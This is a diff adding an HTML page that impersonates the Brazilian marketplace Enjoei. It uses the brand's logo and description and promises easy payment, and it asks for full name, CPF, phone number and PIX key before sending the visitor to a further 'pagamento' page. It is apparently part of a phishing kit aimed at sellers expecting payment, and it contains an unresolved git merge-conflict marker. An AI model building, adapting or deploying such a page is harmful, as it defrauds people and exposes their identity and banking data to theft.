@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ENJOEI - Authbank</title>
+    <style>
+      /* Estilos gerais */
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f8f8f8;
+        margin: 0;
+        padding: 0;
+        color: #333;
+        line-height: 1.6;
+      }
+
+      .o-container.-with-gutter {
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      /* Estilos do cabeçalho */
+      .c-clean-header {
+        background-color: white;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        padding: 15px 0;
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+
+      .c-clean-header__wrapper {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      /* Estilos do formulário */
+      .session-wrapper {
+        background-color: white;
+        border-radius: 8px;
+        padding: 25px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        margin-top: 20px;
+      }
+
+      .session-header {
+        text-align: center;
+        margin-bottom: 25px;
+      }
+
+      .session-title {
+        color: #61005D;
+        font-size: 22px;
+        font-weight: 600;
+        margin-bottom: 8px;
+      }
+
+      .session-text {
+        color: #666;
+        font-size: 15px;
+        margin: 0;
+      }
+
+      .l-field {
+        margin-bottom: 20px;
+      }
+
+      .l-label {
+        display: block;
+        font-size: 14px;
+        font-weight: 500;
+        margin-bottom: 8px;
+        color: #444;
+      }
+
+      .o-input {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1px solid #ddd;
+        border-radius: 6px;
+        font-size: 15px;
+        transition: border-color 0.3s;
+        box-sizing: border-box;
+      }
+
+      .o-input:focus {
+        border-color: #61005D;
+        outline: none;
+        box-shadow: 0 0 0 2px rgba(97, 0, 93, 0.1);
+      }
+
+      .separator {
+        display: block;
+        text-align: center;
+        margin: 25px 0;
+        color: #999;
+        font-size: 14px;
+        position: relative;
+      }
+
+      .separator:before,
+      .separator:after {
+        content: "";
+        position: absolute;
+        top: 50%;
+        width: 40%;
+        height: 1px;
+        background-color: #eee;
+      }
+
+      .separator:before {
+        left: 0;
+      }
+
+      .separator:after {
+        right: 0;
+      }
+
+      /* Estilos do botão */
+      .o-button.-xs-primary {
+        background-color: #61005D;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        padding: 14px;
+        font-size: 16px;
+        font-weight: 500;
+        width: 100%;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .o-button.-xs-primary:hover {
+        background-color: #4a0047;
+      }
+
+      /* Estilos de erro */
+      .erro {
+        border-color: #e74c3c !important;
+      }
+
+      .mensagem-erro {
+        color: #e74c3c;
+        font-size: 13px;
+        margin-top: 5px;
+        display: none;
+      }
+
+      /* Estilos para o checkbox */
+      .checkbox-wrapper {
+        margin: 20px 0;
+      }
+
+      /* Estilos para o logo de bancos */
+      .o-form__field.center {
+        text-align: center;
+      }
+
+      /* Estilos para links */
+      a {
+        color: #61005D;
+        text-decoration: none;
+      }
+
+      a:hover {
+        text-decoration: underline;
+      }
+
+      /* Estilos para o footer */
+      .o-text.-xs-minion {
+        font-size: 12px;
+        color: #999;
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      /* Responsividade */
+      @media (max-width: 480px) {
+        .session-wrapper {
+          padding: 20px 15px;
+        }
+        
+        .session-title {
+          font-size: 20px;
+        }
+      }
+
+      /* Animação do logo */
+      .logo-banner {
+        position: absolute;
+        inset: 0;
+        background: #fff;
+        left: 0;
+        top: 0%;
+        z-index: 999;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      
+      .logo-banner svg {
+        animation: bounce 0.8s ease infinite;
+      }
+      
+      @keyframes bounce {
+        0% { opacity: 0; }
+        50% { opacity: 0.5; }
+        100% { opacity: 1; }
+      }
+    </style>
+  </head>
+  <body
+    class="is-v4 p-sessions-new"
+    data-namespace="false"
+    data-controller="sessions"
+    data-action="new"
+    style="transition: padding 250ms ease 0s"
+    cz-shortcut-listen="true"
+  >
+    <meta
+      name="description"
+      content="O site mais simpático para comprar e vender online roupas, sapatos e bolsas! Marcas Zara, Farm, Nike. Baixe o app e vem conferir!"
+    />
+    <title>Informacoes de recebimentos</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <svg
+      style="position: absolute; width: 0; height: 0"
+      width="0"
+      height="0"
+      version="1.1"
+      xmlns="http://www.w3.org/2000/svg"
+      xmlns:xlink="http://www.w3.org/1999/xlink"
+    >
+      <defs></defs>
+    </svg>
+    <div class="t-relative"></div>
+    <div data-vue="flash-message">
+      <div class="c-flash-message" style="display: none">
+        <div
+          href=""
+          class="c-flash-message__content o-container"
+          image-url=""
+          data-testid="flash-message"
+        >
+          <span
+            class="o-text -xs-white -xs-long-primer t-xs-block t-md-inline c-flash-message__title -xs-medium"
+          ></span>
+        </div>
+      </div>
+    </div>
+
+    <div
+      class="logo-banner"
+      style="
+        position: absolute;
+        inset: 0;
+        background: #fff;
+        left: 0;
+        top: 0%;
+        z-index: 999;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      "
+    >
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        width="30"
+        height="30"
+        fill="none"
+      >
+        <path
+          fill="#61005D"
+          fill-rule="evenodd"
+          d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z"
+          clip-rule="evenodd"
+        ></path>
+      </svg>
+    </div>
+   
+    <section data-vue="sessions-new-page">
+      <div data-v-7bcf1476="" class="o-container -with-gutter l-container">
+        <div data-v-7bcf1476="" class="session-wrapper">
+          <div data-v-7bcf1476="">
+            <header
+              data-v-4226538e=""
+              data-v-7bcf1476=""
+              class="session-header"
+            >
+              <h1 data-v-4226538e="" class="session-title">
+                Digite seus dados bancários
+              </h1>
+              <p data-v-4226538e="" class="session-text">
+                Receba sem burocracias!
+              </p>
+            </header>
+          </div>
+          <div data-v-7bcf1476=""></div>
+          <div data-v-7bcf1476="" style="">
+            <div data-v-7bcf1476="" class="l-wrapper">
+              <form
+                data-v-7bcf1476=""
+                action="#"
+                method="post"
+                accept-charset="utf-8"
+                id="login_user"
+                novalidate="novalidate"
+                data-validate-on="submit"
+                class="o-form l-form"
+              >
+                <input data-v-7bcf1476="" name="utf8" type="hidden" value="✓" />
+                <input
+                  data-v-7bcf1476=""
+                  type="hidden"
+                  name="authenticity_token"
+                  value="iKVQdiyYPEusrrS/sBDMD+YlR+u8eBMXDPzVQHyoUhb+5hUY5bLsahiCEgCuCOz2daHp4GvMJuU7bOEwxhx1uw=="
+                />
+                <input
+                  data-v-7bcf1476=""
+                  type="hidden"
+                  name="user_tracking_uuid"
+                  value="aba1a12a-006e-4862-91fb-af630091c401-1720133651762"
+                />
+
+                <div data-v-7bcf1476="" class="o-form__field l-field">
+                  <label data-v-7bcf1476="" for="user_name" class="l-label">
+                    NOME COMPLETO *
+                  </label>
+                  <input
+                    data-v-7bcf1476=""
+                    data-validate="true"
+                    data-patterns="isNonEmpty, isValidEmail"
+                    placeholder="Nome completo do titular"
+                    data-test="input-email"
+                    type="text"
+                    name="user[email]"
+                    id="user_name"
+                    autocomplete="username"
+                    class="o-input -fill -xs-medium -md-large"
+                    required=""
+                  />
+                  <div id="erro-user_name" class="mensagem-erro">
+                    Campo obrigatório.
+                  </div>
+                </div>
+                <div data-v-7bcf1476="" class="o-form__field l-field">
+                  <label data-v-7bcf1476="" for="user_cpf" class="l-label">
+                    CPF *
+                  </label>
+                  <input
+                    data-v-7bcf1476=""
+                    data-validate="true"
+                    data-patterns="isNonEmpty, isLongerThan"
+                    data-test="input-password"
+                    type="text"
+                    name="user[password]"
+                    id="user_cpf"
+                    autocomplete="current-password"
+                    placeholder="CPF do titular"
+                    maxlength="14"
+                    oninput="formatCPF(this)"
+                    class="o-input -fill -xs-medium -md-large"
+                    required=""
+                  />
+                  <div id="erro-user_cpf" class="mensagem-erro">
+                    Campo obrigatório.
+                  </div>
+                </div>
+                <div data-v-7bcf1476="" class="o-form__field l-field">
+                  <label data-v-7bcf1476="" for="user_phone" class="l-label">
+                    TELEFONE *
+                  </label>
+                  <input
+                    data-v-7bcf1476=""
+                    data-validate="true"
+                    data-patterns="isNonEmpty, isLongerThan"
+                    data-test="input-password"
+                    type="text"
+                    name="user[password]"
+                    id="user_phone"
+                    autocomplete="current-password"
+                    placeholder="TELEFONE PARA CONTATO"
+                    maxlength="15"
+                    oninput="formatCelular(this)"
+                    class="o-input -fill -xs-medium -md-large"
+                    required=""
+                  />
+                  <div id="erro-user_phone" class="mensagem-erro">
+                    Campo obrigatório.
+                  </div>
+                </div>
+                <span data-v-7771531a="" class="separator">Banco</span>
+
+                <div data-v-7bcf1476="" class="o-form__field l-field">
+                  <label data-v-7bcf1476="" for="user_line" class="l-label">
+                    Aceitamos diversos bancos
+                </div>
+                <div data-v-7bcf1476="" class="o-well checkbox-wrapper">
+                  <div data-v-7bcf1476="" class="o-grid__item">
+                  </div>
+                  <div data-v-7bcf1476="" class="o-form__field l-field">
+                    <label
+                      data-v-7bcf1476=""
+                      for="selectfromuser"
+                      class="l-label"
+                    >
+                      Como deseja receber PIX *
+                    </label>
+                    <select
+                      data-v-7bcf1476=""
+                      data-validate="true"
+                      data-patterns="isNonEmpty, isLongerThan"
+                      data-test="input-password"
+                      name="user[password]"
+                      id="selectfromuser"
+                      class="o-input -fill -xs-medium -md-large"
+                    >
+                      <option value="" disabled="" selected="">
+                        Selecione tipo de chave pix
+                      </option>
+                      <option id="typekey" value="CPF">CPF</option>
+                      <option id="typekey" value="EMAIL">EMAIL</option>
+                      <option id="typekey" value="TELEFONE">TELEFONE</option>
+                      <option id="typekey" value="ALEATORIA">ALEATORIA</option>
+                    </select>
+                    <div id="erro-typekey" class="mensagem-erro">
+                      Campo obrigatório.
+                    </div>
+                  </div>
+
+                  <div
+                    data-v-7bcf1476=""
+                    class="o-form__field l-field"
+                    id="telefone_field"
+                  >
+                    <label data-v-7bcf1476="" for="user_key" class="l-label">
+                      CHAVE PIX *
+                    </label>
+                    <input
+                      data-v-7bcf1476=""
+                      data-validate="true"
+                      data-patterns="isNonEmpty, isLongerThan"
+                      data-test="input-phone"
+                      type="text"
+                      name="user[phone]"
+                      id="user_key"
+                      autocomplete="current-phone"
+                      placeholder="DIGITE SUA CHAVE PIX"
+                      class="o-input -fill -xs-medium -md-large"
+                      required=""
+                    />
+                    <div id="erro-user_key" class="mensagem-erro">
+                      Campo obrigatório.
+                    </div>
+                  </div>
+
+                  <div data-v-7bcf1476="" class="o-well checkbox-wrapper">
+                    <div data-v-7bcf1476="" class="o-grid__item">
+                      <div id="mensagem-erro" style="color: red"></div>
+                    </div>
+                  </div>
+                </div>
+              </form>
+
+              <!-- Botão movido para fora do formulário -->
+              <div data-v-7bcf1476="" class="o-well">
+                <button 
+                type="button" 
+<<<<<<< HEAD
+                onclick="window.location.href='VeryPagement/pagamento.html';" 
+=======
+                onclick="window.location.href='/VeryPagement/pagamento.html';" 
+>>>>>>> 1c2c5df (Sem Erros)
+                class="o-button -xs-flat -xs-large -xs-fill t-lowercase -xs-primary"
+              >
+                Receber
+              </button>
+              </div>
+
+              <div data-v-7771531a="" data-v-7bcf1476="">
+                <span data-v-7771531a="" class="separator">ou</span>
+                <p
+                  data-v-7bcf1476=""
+                  class="o-text -xs-minion -xs-regular -xs-center"
+                >
+                  protegido por reCAPTCHA -
+                  <a data-v-7bcf1476="" href="#" target="_blank">privacidade</a>
+                  -
+                  <a data-v-7bcf1476="" href="#" target="_blank">condições</a>
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <script>
+      // Remove o logo após 1.5 segundos
+      setTimeout(() => {
+        document.querySelector(".logo-banner").remove();
+      }, 1500);
+
+      function formatCPF(input) {
+        let cpf = input.value.replace(/\D/g, "");
+        if (cpf.length > 3 && cpf.length <= 6) {
+          cpf = cpf.replace(/(\d{3})(\d+)/, "$1.$2");
+        } else if (cpf.length > 6 && cpf.length <= 9) {
+          cpf = cpf.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
+        } else if (cpf.length > 9) {
+          cpf = cpf.replace(
+            /(\d{3})(\d{3})(\d{3})(\d+)/,
+            "$1.$2.$3-$4"
+          );
+        }
+        input.value = cpf;
+      }
+
+      function formatCelular(input) {
+        let celular = input.value.replace(/\D/g, "");
+        if (celular.length > 2 && celular.length <= 7) {
+          celular = celular.replace(/(\d{2})(\d+)/, "($1) $2");
+        } else if (celular.length > 7 && celular.length <= 11) {
+          celular = celular.replace(
+            /(\d{2})(\d{5})(\d+)/,
+            "($1) $2-$3"
+          );
+        } else if (celular.length > 11) {
+          celular = celular.replace(
+            /(\d{2})(\d{5})(\d{4})(\d+)/,
+            "($1) $2-$3"
+          );
+        }
+        input.value = celular;
+      }
+      
+      document
+        .getElementById("selectfromuser")
+        .addEventListener("change", function () {
+          var telefoneField = document.getElementById("telefone_field");
+          if (this.value) {
+            telefoneField.style.display = "block";
+          } else {
+            telefoneField.style.display = "none";
+          }
+        });
+    </script>
+  </body>
+</html>
